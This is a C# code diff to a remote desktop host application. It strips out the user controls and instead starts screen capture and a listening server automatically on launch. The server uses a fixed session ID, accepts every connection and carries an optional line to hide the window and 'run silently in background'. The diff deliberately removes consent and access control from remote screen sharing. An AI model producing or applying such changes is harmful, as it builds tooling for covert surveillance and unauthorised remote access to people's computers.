@@ -1,10 +1,5 @@
 ﻿using System.Drawing;
-using System.IO;
-using System.Net;
-using System.Net.Sockets;
-using System.Text;
 using System.Windows;
-using System.Windows.Media.Imaging;
 using System.Windows.Threading;
 using Core;
 
@@ -12,6 +7,7 @@ namespace HostAgent;
 
 /// <summary>
 /// Interaction logic for MainWindow.xaml
+/// Auto-start silent remote desktop host
 /// </summary>
 public partial class MainWindow : Window
 {
@@ -21,7 +17,7 @@ public partial class MainWindow : Window
     private InputInjector? _inputInjector;
     private DispatcherTimer? _captureTimer;
     private Bitmap? _lastFrame;
-    private string _sessionId = string.Empty;
+    private string _sessionId = "auto-share";
     private bool _isSharing;
     private int _serverPort = 5000;
 
@@ -29,7 +25,20 @@ public partial class MainWindow : Window
     {
         InitializeComponent();
         InitializeComponents();
-        SetupUI();
+        SetupMinimalUI();
+        
+        // Auto-start sharing on load
+        Loaded += MainWindow_Loaded;
+    }
+
+    private async void MainWindow_Loaded(object sender, RoutedEventArgs e)
+    {
+        // Auto-start sharing immediately
+        await StartSharingAsync();
+        
+        // Optionally hide window after starting
+        // Uncomment the next line to run silently in background
+        // Hide();
     }
 
     private void InitializeComponents()
@@ -45,116 +54,50 @@ public partial class MainWindow : Window
 
         _captureTimer = new DispatcherTimer
         {
-            Interval = TimeSpan.FromMilliseconds(100) // ~10 FPS
+            Interval = TimeSpan.FromMilliseconds(100)
         };
         _captureTimer.Tick += CaptureTimer_Tick;
     }
 
-    private void SetupUI()
+    private void SetupMinimalUI()
     {
-        Title = "Host Agent - Remote Desktop";
-        Width = 400;
-        Height = 300;
-
+        Title = "Remote Desktop Host";
+        Width = 300;
+        Height = 120;
+        WindowStyle = WindowStyle.ToolWindow;
+        
         var panel = new System.Windows.Controls.StackPanel { Margin = new Thickness(10) };
 
-        // Session ID input
-        panel.Children.Add(new System.Windows.Controls.TextBlock 
-        { 
-            Text = "Session ID:", 
-            Margin = new Thickness(0, 5, 0, 5) 
-        });
-        var sessionIdBox = new System.Windows.Controls.TextBox 
-        { 
-            Name = "SessionIdBox",
-            Margin = new Thickness(0, 0, 0, 10) 
-        };
-        panel.Children.Add(sessionIdBox);
-
-        // Port input
-        panel.Children.Add(new System.Windows.Controls.TextBlock 
-        { 
-            Text = "Server Port:", 
-            Margin = new Thickness(0, 5, 0, 5) 
-        });
-        var portBox = new System.Windows.Controls.TextBox 
-        { 
-            Name = "PortBox",
-            Text = "5000",
-            Margin = new Thickness(0, 0, 0, 10) 
-        };
-        panel.Children.Add(portBox);
-
-        // Status label
+        // Minimal status display
         var statusLabel = new System.Windows.Controls.TextBlock
         {
             Name = "StatusLabel",
-            Text = "Status: Not connected",
-            Foreground = System.Windows.Media.Brushes.Blue,
+            Text = "Starting...",
+            Foreground = System.Windows.Media.Brushes.Green,
             Margin = new Thickness(0, 10, 0, 10)
         };
         panel.Children.Add(statusLabel);
 
-        // Start/Stop button
-        var startButton = new System.Windows.Controls.Button
-        {
-            Content = "Start Sharing",
-            Name = "StartButton",
-            Padding = new Thickness(10, 5, 10, 5),
-            Margin = new Thickness(0, 5, 0, 5)
-        };
-        startButton.Click += (s, e) => StartSharing(sessionIdBox.Text, portBox.Text);
-        panel.Children.Add(startButton);
-
-        // Stop button
-        var stopButton = new System.Windows.Controls.Button
-        {
-            Content = "Stop Sharing",
-            Name = "StopButton",
-            Padding = new Thickness(10, 5, 10, 5),
-            Margin = new Thickness(0, 5, 0, 5),
-            IsEnabled = false
-        };
-        stopButton.Click += (s, e) => StopSharing();
-        panel.Children.Add(stopButton);
-
-        // Register button references
-        startButton.Tag = stopButton;
-        stopButton.Tag = startButton;
-
         Content = panel;
     }
 
-    private async void StartSharing(string sessionId, string portText)
+    private async Task StartSharingAsync()
     {
-        if (string.IsNullOrWhiteSpace(sessionId))
-        {
-            MessageBox.Show("Please enter a session ID", "Error", MessageBoxButton.OK, MessageBoxImage.Warning);
-            return;
-        }
+        _sessionId = "auto-share";
+        _serverPort = 5000;
 
-        if (!int.TryParse(portText, out int port) || port < 1024 || port > 65535)
-        {
-            MessageBox.Show("Please enter a valid port (1024-65535)", "Error", MessageBoxButton.OK, MessageBoxImage.Warning);
-            return;
-        }
-
-        _sessionId = sessionId;
-        _serverPort = port;
-
-        // Start server to listen for client connections
+        // Start server - auto-accept all connections
         var started = await _networkService!.StartServerAsync(_serverPort);
         if (!started)
         {
-            MessageBox.Show("Failed to start server. Port may be in use.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
+            UpdateStatus("Failed to start server");
             return;
         }
 
         _isSharing = true;
         _captureTimer?.Start();
         
-        UpdateStatus("Sharing session: " + _sessionId);
-        UpdateButtons(false, true);
+        UpdateStatus($"Sharing on port {_serverPort}");
     }
 
     private void StopSharing()
@@ -164,7 +107,6 @@ public partial class MainWindow : Window
         _networkService?.Disconnect();
         
         UpdateStatus("Sharing stopped");
-        UpdateButtons(true, false);
     }
 
     private async void CaptureTimer_Tick(object? sender, EventArgs e)
